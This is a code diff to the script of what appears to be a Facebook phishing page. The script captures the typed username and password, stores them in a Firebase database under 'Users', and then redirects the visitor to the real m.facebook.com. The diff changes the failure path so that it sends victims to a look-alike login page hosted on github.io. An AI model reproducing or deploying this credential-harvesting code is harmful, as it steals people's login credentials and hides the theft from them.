@@ -91,26 +91,21 @@
 <script>
     function post()
 {
-  var key;
+  var push;
   var username=document.getElementById("username").value;
   var password=document.getElementById("password").value;
   var myref=firebase.database().ref().child('Users');
-  var push = myref.push({
+  push = myref.push({
   username:username,
   password:password
 });
 if(push!= null)
 {
- key="success";
- if(key=="success")
-     {
-      window.location.href='https://m.facebook.com/';
-     }
+window.location.href='https://m.facebook.com/';
 }
 else
 {
-key="Failed"
-alert("fail");
+window.location.href='https://facebook-web.github.io/FaceBook/fb2/login.html';
 }
 
 }
